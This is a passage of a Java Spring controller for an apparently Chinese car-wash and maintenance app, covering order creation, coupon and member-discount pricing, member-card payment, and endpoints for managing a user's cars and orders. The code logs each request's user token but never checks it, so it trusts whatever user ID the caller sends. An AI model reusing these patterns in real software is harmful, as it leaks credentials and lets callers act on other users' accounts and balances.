			Date endTime = sdf.parse(etime);
			boolean stimeValidate = startTime.getTime() >= shouldStartTime
					.getTime() && endTime.getTime() <= shouldEndTime.getTime();
			boolean etimeValidate = endTime.getTime() >= shouldStartTime
					.getTime() && endTime.getTime() <= shouldEndTime.getTime();
			if (!(stimeValidate && etimeValidate)) {
				dataMap.put("result", "501");// 预约服务日期过期
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			/**************** 再次检查预约服务 时间END **************/

			/** 数据获取 **/
			Member member = memberService.find(uid);
			UserCar userCar = userCarService.find(ucid);
			Car car = userCar.getCar();

			Order order = new Order();
			order.setPhone(phone);
			order.setContact(contact);
			order.setType(2); // 上门保养订单
			order.setLat(lat);
			order.setLng(lng);
			order.setAddress(address);
			order.setServerWay(1);
			order.setPayWay(payWay);
			order.setMember(member);
			order.setCar(car);
			order.setDrange(userCar.getDrange());
			order.setCarColor(color);
			order.setCarNum(plateNumber);
			order.setStartDate(startTime);
			order.setEndDate(endTime);
			order.setRemark(remark);
			order.setNum(CommonUtil.getOrderNum()); // 订单编号
			if (cpid != null && !"".equals(cpid)) {
				order.setMemberCoupon(memberCouponService.find(cpid));
			}
			order.setStatus(11); // 预约成功
			order.setIsPay(false); // 设置默认为false
			/** 核实价格--数据准备 */
			List<String> scids = new ArrayList<String>();
			Map<String, Integer> productMap = new HashMap<String, Integer>();

			/** 解析httpData Json数据包 **/
			Map<String, Map<String, Integer>> packMap = mapper.readValue(
					httpData, Map.class);
			for (String scid : packMap.keySet()) {
				ServiceType serviceType = serviceTypeService.find(scid);
				ServerOrder so = new ServerOrder();
				so.setName(serviceType.getName());
				so.setPrice(serviceType.getPrice());
				so.setServiceType(serviceType);
				so.setOrder(order);
				Map<String, Integer> pmap = packMap.get(scid);
				scids.add(scid); // 为计算价格作数据准备
				for (String pid : pmap.keySet()) {
					Product product = productService.find(pid);
					ServerOrderDetail sod = new ServerOrderDetail();
					if (product.getProuductUniqueType() != null
							&& product.getProuductUniqueType() == 3) {// 天天特价
						sod.setPrice(product.getDiscountMoney());
					} else {
						sod.setPrice(product.getMarketPrice());
					}
					sod.setCount(pmap.get(pid).floatValue());
					sod.setName(product.getName());
					sod.setServerOrder(so);
					sod.setOrder(order);
					sod.setProduct(product);
					order.getServerOrderDetail().add(sod);
					so.getServerOrderDetail().add(sod);
					productMap.put(pid, pmap.get(pid)); // 为计算价格作数据准备
				}
				order.getServerOrder().add(so); // 添加对应服务
			}

			/** 核实价格 */
			Map<String, String> priceMap = this.calcPrice(scids, productMap,
					cpid, 2, uid);

			order.setAmount_money(Float.parseFloat(priceMap.get("orimoney"))); // 原价
			order.setAmount_paid(Float.parseFloat(priceMap.get("cpmoney"))); // 优惠了的价钱
			order.setPrice(Float.parseFloat(priceMap.get("paymoney"))); // 实付价
			/**************** 检测会员卡支付START ************/
			if (payWay == 1) {// 会员卡支付
				double oprice = order.getPrice();
				double userMoney = member.getMoney();
				if (oprice > userMoney) {// 订单价大于了余额
					dataMap.put("result", "001");
					dataMap.put("oid", order.getId());
					dataMap.put("onum", order.getNum());
					dataMap.put("payAction", "3"); // 余额不足
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				} else { // 事务处理..
					member.setMoney(CommonUtil.subtract(userMoney + "", oprice
							+ ""));
					order.setIsPay(true);
					orderService.memberCarPay(order, member);
					dataMap.put("result", "001");
					dataMap.put("oid", order.getId());
					dataMap.put("onum", order.getNum());
					dataMap.put("payAction", 2); // 支付完成
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				}
			}
			/**************** 检测会员卡支付END ************/
			if (order.getPrice() == 0 || order.getPayWay() == 5) { // 不需要支付;POS机现场支付
				order.setIsPay(true);
				MemberCoupon mc = order.getMemberCoupon();
				if (mc != null) {// 扣除优惠券
					mc.setStatus(1);
					memberCouponService.update(mc);
				}
			}
			orderService.save(order);
			FeeRecord feeRecord = new FeeRecord();
			feeRecord.setType(2);
			feeRecord.setOrder(order);
			feeRecord.setPayWay(order.getPayWay());
			feeRecord.setPhone(order.getPhone());
			feeRecord.setTradeNo(null);
			feeRecord.setFee(order.getPrice());
			feeRecord.setVisible(false);
			feeRecord.setMember(member);
			feeRecordService.save(feeRecord);
			dataMap.put("result", "001");
			dataMap.put("oid", order.getId());
			if (order.getPayWay() == 4) {// 微信支付
				dataMap.put("onum", WexinPay.weixinOrder(order.getNum(),
						order.getPrice(), WeChatPayUtil.pay_return, "保养订单",
						request));
			} else if (order.getPayWay() == 3) {// 银联支付
				dataMap.put("onum", UnionPay.payNumber(order.getNum(),
						order.getPrice(), UnionPayUtil.pay_return));
			} else {
				dataMap.put("onum", order.getNum());
			}
			dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (CouponUseExcepton cue) {
			cue.printStackTrace();
			return "{\"result\":\"502\"}";
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 提交产品订单 《没有对应的地区数据》
	 */
	@RequestMapping(value = "/order/product/save", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String orderProductSave(String uid, String token, String pid,
			String pnumber, String contact, String phone, String aid,
			String address, int payWay,
			@RequestParam(required = false) String cpid,
			@RequestParam(required = false) String ucid) {
		try {
			log.info("App【提交产品订单】：" + "uid=" + uid + " token=" + token
					+ " ucid=" + ucid + " contract=" + contact + " phone="
					+ phone + " address=" + address + " ucid=" + ucid
					+ " payWay=" + payWay + " cpid=" + cpid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			if (payWay == 5) {// 不支持“现场支付”
				dataMap.put("result", "503");
				dataMap.put("oid", "");
				dataMap.put("onum", "");
				dataMap.put("payAction", ""); // 余额不足
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
			/** 数据获取 **/
			Member member = memberService.find(uid);
			Order order = new Order();
			order.setPhone(phone);
			order.setContact(contact);
			order.setType(3); // 纯商品订单
			order.setAddress(address);
			order.setArea(areaService.find(aid));
			order.setServerWay(1);
			order.setPayWay(payWay);
			order.setMember(member);
			order.setNum(CommonUtil.getOrderNum()); // 订单编号
			if (cpid != null && !"".equals(cpid)) {
				order.setMemberCoupon(memberCouponService.find(cpid));
			}
			order.setStatus(21); // 已下单
			order.setIsPay(false); // 测试环境，暂时设为true
			/** 核实价格 */
			Map<String, Integer> productMap = new HashMap<String, Integer>();
			productMap.put(pid, Integer.parseInt(pnumber));

			Map<String, String> priceMap = this.calcPrice(null, productMap,
					cpid, 3, uid);
			order.setAmount_money(Float.parseFloat(priceMap.get("orimoney"))); // 原价
			order.setAmount_paid(Float.parseFloat(priceMap.get("cpmoney"))); // 优惠了的价钱
			order.setPrice(Float.parseFloat(priceMap.get("paymoney"))); // 实付价

			if (ucid != null && !"".equals(ucid)) {
				UserCar userCar = userCarService.find(ucid);
				if (userCar != null) {
					Car car = userCar.getCar();
					order.setCar(car);
					order.setDrange(userCar.getDrange());
				}
			}
			Product product = productService.find(pid);
			ServerOrderDetail sod = new ServerOrderDetail();
			if (product.getProuductUniqueType() != null
					&& product.getProuductUniqueType() == 3) {// 天天特价
				sod.setPrice(product.getDiscountMoney());
			} else {
				sod.setPrice(product.getMarketPrice());
			}
			sod.setProduct(product);
			sod.setName(product.getName());
			sod.setOrder(order);
			sod.setCount(Float.parseFloat(pnumber));
			order.getServerOrderDetail().add(sod);

			/**************** 检测会员卡支付START ************/
			if (payWay == 1) {// 会员卡支付
				double oprice = order.getPrice();
				double userMoney = member.getMoney();
				if (oprice > userMoney) {// 订单价大于了余额
					dataMap.put("result", "001");
					dataMap.put("oid", order.getId());
					dataMap.put("onum", order.getNum());
					dataMap.put("payAction", "3"); // 余额不足
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				} else { // 事务处理..
					member.setMoney(CommonUtil.subtract(userMoney + "", oprice
							+ ""));
					order.setIsPay(true);
					orderService.memberCarPay(order, member);
					dataMap.put("result", "001");
					dataMap.put("oid", order.getId());
					dataMap.put("onum", order.getNum());
					dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				}
			}
			/**************** 检测会员卡支付END ************/
			if (order.getPrice() == 0) { // 不需要支付
				order.setIsPay(true);
				MemberCoupon mc = order.getMemberCoupon();
				if (mc != null) {// 扣除优惠券
					mc.setStatus(1);
					memberCouponService.update(mc);
				}
			}
			orderService.save(order);
			FeeRecord feeRecord = new FeeRecord();
			feeRecord.setType(2);
			feeRecord.setOrder(order);
			feeRecord.setPayWay(order.getPayWay());
			feeRecord.setPhone(order.getPhone());
			feeRecord.setTradeNo(null);
			feeRecord.setFee(order.getPrice());
			feeRecord.setVisible(false);
			feeRecord.setMember(member);
			feeRecordService.save(feeRecord);
			dataMap.put("result", "001");
			dataMap.put("oid", order.getId());
			if (order.getPayWay() == 4) {// 微信支付
				dataMap.put("onum", WexinPay.weixinOrder(order.getNum(),
						order.getPrice(), WeChatPayUtil.pay_return, "商品订单",
						request));
			} else if (order.getPayWay() == 3) {// 银联支付
				dataMap.put("onum", UnionPay.payNumber(order.getNum(),
						order.getPrice(), UnionPayUtil.pay_return));
			} else {
				dataMap.put("onum", order.getNum());
			}
			dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (CouponUseExcepton cue) {
			cue.printStackTrace();
			return "{\"result\":\"502\"}";
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 计算订单价格
	 */
	@RequestMapping(value = "/order/price/calc", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String orderPriceCalc(String uid, String token, int otype,
			@RequestParam(required = false) String scid,
			@RequestParam(required = false) String pid,
			@RequestParam(required = false) String cpid) {
		try {
			log.info("App【计算价格】：" + "uid=" + uid + " token=" + token);
			List<String> scidList = new ArrayList<String>();
			Map<String, Integer> pidMap = new HashMap<String, Integer>();
			if (scid != null && scid.length() > 0) {
				String[] scids = scid.split("#");
				for (String str : scids) {
					scidList.add(str);
				}
			}
			if (pid != null && pid.length() > 0) {
				String[] pids = pid.split("#");
				for (String str : pids) {
					String[] pidNums = str.split("_");
					pidMap.put(pidNums[0], Integer.parseInt(pidNums[1]));
				}
			}
			String json = mapper.writeValueAsString(this.calcPrice(scidList,
					pidMap, cpid, otype, uid));
			log.info("App【数据响应】：" + json);
			return json;
		} catch (CouponUseExcepton cue) {// 优惠券使用异常
			return "{\"result\":\"502\"}";
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 功能：计算价格 如果优惠券使用错误抛出异常
	 * 
	 * @param scids
	 * @param productMap
	 *            <String(产品ID),Integer(产品数量)>
	 * @param cpid
	 * @param otype
	 *            订单类型 1=洗车、2=保养、3=商品
	 * @return map.put("result", "001"); // 结果<br>
	 *         map.put("ocmoney", ocmoney + ""); // 服务品总价<br>
	 *         map.put("opmoney", ocmoney + ""); // 商品总价<br>
	 *         map.put("orimoney", orimoney + ""); // 应付总价<br>
	 *         map.put("cpmonney", cpmonney + ""); // 优惠的价<br>
	 *         map.put("paymoney", paymoney + ""); // 实付价<br>
	 * @throws CouponUseExcepton
	 */
	private Map<String, String> calcPrice(List<String> scids,
			Map<String, Integer> productMap, String cpid, int otype, String uid)
			throws CouponUseExcepton {
		float ocmoney = 0; // 服务总价
		float opmoney = 0; // 产品总价
		if (otype == 2 && (productMap == null || productMap.size() == 0)) { // 纯保养[不带商品]
			ocmoney = Float.parseFloat(CommonAttributes.getInstance()
					.getSystemBean().getPrice());
		} else if (scids != null && scids.size() > 0) {
			for (String scid : scids) {
				ocmoney = CommonUtil.add(ocmoney + "",
						serviceTypeService.find(scid).getPrice() + "");
			}
		}
		if (productMap != null && productMap.size() > 0) {
			for (String pid : productMap.keySet()) {
				Product product = productService.find(pid);
				if (product.getProuductUniqueType() != null
						&& product.getProuductUniqueType() == 3) {// 天天特价
					if (cpid != null && !"".equals(cpid)) { // 不能使用优惠券
						throw new CouponUseExcepton("天天特价商品不能使用优惠券：【商品ID】："
								+ product.getId() + " 【商品名称】："
								+ product.getName());
					} else { // 使用特价计算
						opmoney = CommonUtil.add(
								opmoney + "",
								CommonUtil.mul(product.getDiscountMoney() + "",
										productMap.get(pid) + "") + "");
					}
				} else {
					opmoney = CommonUtil.add(
							opmoney + "",
							CommonUtil.mul(product.getMarketPrice() + "",
									productMap.get(pid) + "") + "");
				}
			}
		}
		float orimoney = CommonUtil.add(ocmoney + "", opmoney + ""); // 应支付的价钱
		float cpmonney = 0; // 优惠的价钱
		float paymoney = orimoney; // 实际支付金额
		if (cpid != null && !"".equals(cpid)) {
			MemberCoupon memberCoupon = memberCouponService.find(cpid);
			if (memberCoupon.getUseType() != otype) {
				throw new CouponUseExcepton("优惠券使用不正确：优惠券类型不对应");
			}
			if (memberCoupon.getType() == 1) { // 1满额打折优惠券
				if (orimoney < memberCoupon.getMinPrice()) {
					throw new CouponUseExcepton("优惠券使用不正确：订单金额少于"
							+ memberCoupon.getMinPrice());
				} else {
					cpmonney = CommonUtil.mul(orimoney + "",
							memberCoupon.getRate() + "");
					paymoney = CommonUtil
							.subtract(orimoney + "", cpmonney + "");
				}
			} else if (memberCoupon.getType() == 2) {// 2满额减免优惠券
				if (orimoney < memberCoupon.getMinPrice()) {
					throw new CouponUseExcepton("优惠券使用不正确：订单金额少于"
							+ memberCoupon.getMinPrice());
				} else {
					cpmonney = Float
							.parseFloat(memberCoupon.getDiscount() + "");
					paymoney = CommonUtil
							.subtract(orimoney + "", cpmonney + "");
				}
			} else if (memberCoupon.getType() == 3) { // 3免额多少优惠券
				cpmonney = Float.parseFloat(memberCoupon.getDiscount() + "");
				paymoney = CommonUtil.subtract(orimoney + "", cpmonney + "");
			}
		} else {
			Member member = memberService.find(uid);
			MemberRank memberRank = member.getMemberRank();
			if (memberRank != null) {
				paymoney = CommonUtil.mul(orimoney + "", memberRank.getScale()
						+ "");
				cpmonney = CommonUtil.subtract(orimoney + "", paymoney + "");
			}
		}
		Map<String, String> map = new LinkedHashMap<String, String>();
		map.put("result", "001"); // 产品总价
		map.put("ocmoney", ocmoney + ""); // 产品总价
		map.put("opmoney", opmoney + ""); // 服务总价
		map.put("orimoney", orimoney + ""); // 应付总价
		map.put("cpmoney", cpmonney + ""); // 优惠的价
		map.put("paymoney", (paymoney > 0 ? paymoney : 0) + ""); // 实付价
		return map;
	}

	/**
	 * 获取用户的车辆信息列表
	 */
	@RequestMapping(value = "/user/cars", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCarList(String uid, String token) {
		try {
			log.info("App【获取用户所有车辆信息列表】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 */
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.member.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(uid);
			List<UserCar> userCars = userCarService.getScrollData(
					jpql.toString(), params.toArray(), orderby).getResultList();

			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (UserCar userCar : userCars) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				Car car = userCar.getCar();
				CarType carType = car.getCarType();
				CarBrand carBrand = carType.getCarBrand();

				map.put("ucid", userCar.getId());
				map.put("defaultCar", userCar.getDefaultCar() ? 1 : 0);
				map.put("color", userCar.getCarColor());
				map.put("plateNumber", userCar.getCarNum());
				map.put("fuel", userCar.getFuel());
				map.put("drange", userCar.getDrange());
				map.put("engines", userCar.getEngines());
				if (userCar.getRoadDate() != null) {
					SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
					map.put("date", sdf.format(userCar.getRoadDate()));
				} else {
					map.put("date", "");
				}
				map.put("cmid", car.getId());
				map.put("cmname", car.getName());
				map.put("csid", carType.getId());
				map.put("csname", carType.getName());
				map.put("cbid", carBrand.getId());
				map.put("cbname", carBrand.getName());
				map.put("cbimage", carBrand.getImgPath());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);

			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取用户默认车辆信息
	 */
	@RequestMapping(value = "/user/car", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCarDefault(String uid, String token) {
		try {
			log.info("App【获取用户默认车辆信息】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 获取数据 */
			UserCar userCar = userCarService.defaultCar(uid);
			if (userCar == null) {
				dataMap.put("result", "104"); //
				dataMap.put("ucid", "");
				dataMap.put("defaultCar", 1);
				dataMap.put("colore", "");
				dataMap.put("plateNumber", "");
				dataMap.put("fuel", 0);
				dataMap.put("drange", 0);
				dataMap.put("engines", "");
				dataMap.put("date", "");
				dataMap.put("cmid", "");
				dataMap.put("cmname", "");
				dataMap.put("csid", "");
				dataMap.put("csname", "");
				dataMap.put("cbid", "");
				dataMap.put("cbname", "");
				dataMap.put("cbimage", "");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			Car car = userCar.getCar();
			CarType carType = car.getCarType();
			CarBrand carBrand = carType.getCarBrand();
			dataMap.put("result", "001");

			dataMap.put("ucid", userCar.getId());
			dataMap.put("defalutCar", 1);
			dataMap.put("color", userCar.getCarColor());
			dataMap.put("plateNumber", userCar.getCarNum());
			dataMap.put("fuel", userCar.getFuel());
			dataMap.put("drange", userCar.getDrange());
			dataMap.put("engines", userCar.getEngines());
			if (userCar.getRoadDate() != null) {
				SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
				dataMap.put("date", sdf.format(userCar.getRoadDate()));
			} else {
				dataMap.put("date", "");
			}
			dataMap.put("cmid", car.getId());
			dataMap.put("cmname", car.getName());
			dataMap.put("csid", carType.getId());
			dataMap.put("csname", carType.getName());
			dataMap.put("cbid", carBrand.getId());
			dataMap.put("cbname", carBrand.getName());
			dataMap.put("cbimage", carBrand.getImgPath());
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 修改用户的车型信息
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/carsave", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCarSave(String uid, String token, String ucid, String cmid,
			int defaultCar, @RequestParam(required = false) String color,
			@RequestParam(required = false) String plateNumber,
			@RequestParam(required = false) Double fuel,
			@RequestParam(required = false) Double drange,
			@RequestParam(required = false) String engines,
			@RequestParam(required = false) String date) {
		try {
			log.info("App【保存用户当前的车型】：" + "uid=" + uid + " token=" + token
					+ "cmid=" + cmid + " fule=" + fuel + " drange=" + drange
					+ " engines=" + engines + " date=" + date);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
			Member member = memberService.find(uid);
			if (member == null) {
				dataMap.put("result", "106"); // 用户ID错误
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			/** 保存数据 */
			UserCar userCar = new UserCar();
			if (color != null && !"".equals(color)) {
				userCar.setCarColor(color);
			}
			if (plateNumber != null && !"".equals(plateNumber)) {
				userCar.setCarNum(plateNumber);
			}
			if (fuel != null && fuel > 0) {
				userCar.setFuel(fuel);
			}
			if (drange != null && drange > 0) {
				userCar.setDrange(drange);
			}
			if (engines != null && !"".equals(engines)) {
				userCar.setEngines(engines);
			}
			if (date != null && !"".equals(date)) {
				userCar.setRoadDate(sdf.parse(date));
			}
			Car car = carService.find(cmid);
			if (car != null) {
				userCar.setCar(car);
			}
			userCar.setMember(member);
			userCarService.save(userCar);
			if (defaultCar == 1) {// 重置该用户默认车型
				userCarService.resetDefaultCar(uid, userCar.getId());
				userCar.setDefaultCar(true);
			}
			dataMap.put("result", "001");
			dataMap.put("ucid", userCar.getId());
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 修改用户的车型信息
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/caredit", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCarEdit(String uid, String token, String ucid,
			@RequestParam(required = false) String cmid, int defaultCar,
			@RequestParam(required = false) String color,
			@RequestParam(required = false) String plateNumber,
			@RequestParam(required = false) Double fuel,
			@RequestParam(required = false) Double drange,
			@RequestParam(required = false) String engines,
			@RequestParam(required = false) String date) {
		try {
			log.info("App【修改用户当前的车型】：" + "uid=" + uid + " token=" + token
					+ "cmid=" + cmid + " fule=" + fuel + " drange=" + drange
					+ " engines=" + engines + " date=" + date);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
			/** 数据获取 **/
			UserCar userCar = userCarService.find(ucid);
			if (userCar == null) { // 没有对应的车辆信息
				dataMap.put("result", "104");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}
			if (!userCar.getMember().getId().equals(uid)) {// 非自己的车
				dataMap.put("result", "105");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}

			if (color != null && !"".equals(color)) {
				userCar.setCarColor(color);
			}
			if (plateNumber != null && !"".equals(plateNumber)) {
				userCar.setCarNum(plateNumber);
			}
			if (defaultCar == 1) {// 重置该用户所有车为非默认车
				userCarService.resetDefaultCar(uid, ucid);
				userCar.setDefaultCar(true);
			}
			if (fuel != null && fuel > 0) {
				userCar.setFuel(fuel);
			}
			if (drange != null && drange > 0) {
				userCar.setDrange(drange);
			}
			if (engines != null && !"".equals(engines)) {
				userCar.setEngines(engines);
			}
			if (date != null && !"".equals(date)) {
				userCar.setRoadDate(sdf.parse(date));
			}
			Car car = carService.find(cmid);
			if (car != null) {
				userCar.setCar(car);
			}
			userCarService.update(userCar);
			dataMap.put("result", "001");
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 删除用户的车辆信息
	 * 
	 * @return
	 */
	@RequestMapping(value = "/user/cardelete", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCarDelete(String uid, String token, String ucid) {
		try {
			log.info("App【删除用户当前的车型】：" + "uid=" + uid + " token=" + token
					+ "ucid=" + ucid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			UserCar userCar = userCarService.find(ucid);
			if (userCar == null) { // 没有对应的车辆信息
				dataMap.put("result", "104");
			} else if (userCar.getDefaultCar()) { // 默认车辆不能删除
				dataMap.put("result", "107");
			} else if (!userCar.getMember().getId().equals(uid)) {// 非自己的车
				dataMap.put("result", "105");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			} else {
				dataMap.put("result", "001");
				userCarService.delete(ucid);
			}
			String json = mapper.writeValueAsString(dataMap);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@RequestMapping(value = "/user/order/proceed", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderProceed(String uid, String token, int page, int maxresult) {
		try {
			log.info("App【获取用户下在进行的订单列表】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 */
			PageView<Order> pageView = new PageView<Order>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("createDate", "desc");
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.status>?2 and o.status<?3 and o.member.id=?4 and o.isPay=?5");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(0); // 进行中的订单status>0
			params.add(31); // 未取消
			params.add(uid);
			params.add(true);
			List<Order> orders = orderService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby).getResultList();

			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (Order order : orders) {
				/**
				 * 已完结 0 <br>
				 * 洗车服务订单状态 1派单中 2路途中 3服务中 1-9洗车状态 <br>
				 * 保养服务订单状态 11 预约成功 12 已分配车队 11-19 保养服务状态<br>
				 * 纯商品订单状态 21已下单 22配货中 23送货中 21-29 纯商品订单状态 <br>
				 * 取消订单状态 31待审核 32 审核中 33 退款中 34已退款 35未通过 36已完结【待定】 31-39取消订单状态<br>
				 */
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("oid", order.getId());
				map.put("onum", order.getNum());
				map.put("otype", order.getType());
				map.put("ostatus", order.getStatusString());
				map.put("oprice", order.getPrice() + "");
				if (order.getStatus() == 1 || order.getStatus() == 11
						|| order.getStatus() == 21) { // 派单中=1、预约成功=11、已下单=21，这三种情况可“取消订单”
					map.put("ocanop", 1);
				} else if (order.getStatus() == 23) {// 发货中=23，可进行“确认收货”
					map.put("ocanop", 2);
				} else {
					map.put("ocanop", 0);
				}
				if (order.getType() == 1 && order.getStatus() >= 2
						&& order.getTechMember() != null) { // 洗车订单并且技师已接单（路途中表示已接单）
					map.put("ocontact", "服务技师："
							+ order.getTechMember().getName());
					map.put("ophone", order.getTechMember().getPhonenumber());
					map.put("ostar",
							Math.round(order.getTechMember().getLevel() * 2)
									+ "");
				} else if (order.getType() == 2 && order.getStatus() == 12
						&& order.getCarTeam() != null) {// 保养订单并且已分配车队
					map.put("ocontact", "车队联系人："
							+ order.getCarTeam().getHeadMember());
					map.put("ophone", order.getCarTeam().getHeadPhone());
					map.put("ostar", "");
				} else {
					map.put("ocontact", "");
					map.put("ophone", "");
					map.put("ostar", "");
				}

				List<Map<String, Object>> sclist = new ArrayList<Map<String, Object>>();
				if (order.getType() == 1) {// 洗车订单
					Map<String, Object> scmap = new LinkedHashMap<String, Object>();
					scmap.put("scid", "");
					scmap.put("scimg", "");
					scmap.put("scname", "");
					scmap.put("scprice", 0);
					List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
					for (ServerOrder so : order.getServerOrder()) {
						Map<String, Object> spmap = new LinkedHashMap<String, Object>();
						spmap.put("pid", so.getServiceType().getId()); // 对应服务
																		// ID
						spmap.put("pimg", so.getServiceType().getImgPath());
						spmap.put("pname", so.getName());
						spmap.put("premark", so.getServiceType().getRemark2());//
						spmap.put("pprice", so.getPrice());
						spmap.put("pnum", 0);
						plist.add(spmap);
					}
					scmap.put("plist", plist);
					sclist.add(scmap);
				} else if (order.getType() == 2) {// 保养类订单
					for (ServerOrder so : order.getServerOrder()) {
						Map<String, Object> scmap = new LinkedHashMap<String, Object>();
						scmap.put("scid", so.getServiceType().getId());
						scmap.put("scimg", so.getServiceType().getImgPath());
						scmap.put("scname", so.getName());
						scmap.put("scprice", so.getPrice());
						List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
						for (ServerOrderDetail sod : so.getServerOrderDetail()) {
							Map<String, Object> spmap = new LinkedHashMap<String, Object>();
							spmap.put("pid", sod.getProduct().getId());// 对应于商品ID
							spmap.put("pimg", sod.getProduct().getImgPath());
							spmap.put("pname", sod.getName());
							spmap.put("premark", "");
							spmap.put("pprice", sod.getPrice() == null ? 0
									: sod.getPrice());
							spmap.put("pnum", sod.getCount() == null ? 0
									: CommonUtil.getInteger(sod.getCount()));
							plist.add(spmap);
						}
						scmap.put("plist", plist);
						sclist.add(scmap);
					}
				} else {// 纯商品订单
					Map<String, Object> scmap = new LinkedHashMap<String, Object>();
					scmap.put("scid", "");
					scmap.put("scimg", "");
					scmap.put("scname", "");
					scmap.put("scprice", 0);
					List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
					for (ServerOrderDetail sod : order.getServerOrderDetail()) {
						Map<String, Object> spmap = new LinkedHashMap<String, Object>();
						spmap.put("pid", sod.getProduct().getId());// 对应于商品ID
						spmap.put("pimg", sod.getProduct().getImgPath());
						spmap.put("pname", sod.getName());
						spmap.put("premark", "");
						spmap.put("pprice",
								sod.getPrice() == null ? 0 : sod.getPrice());
						spmap.put("pnum",
								sod.getCount() == null ? 0 : sod.getCount());
						plist.add(spmap);
					}
					scmap.put("plist", plist);
					sclist.add(scmap);
				}
				map.put("sclist", sclist);
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 查询已完结的订单列表
	 * 
	 * @param uid
	 * @param token
	 * @param page
	 * @param maxresult
	 * @return
	 */
	@RequestMapping(value = "/user/order/finish", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userOrderFinish(String uid, String token, int page, int maxresult) {
		try {
			log.info("App【获取用户下已完结的订单列表】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 */
			PageView<Order> pageView = new PageView<Order>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("createDate", "desc");
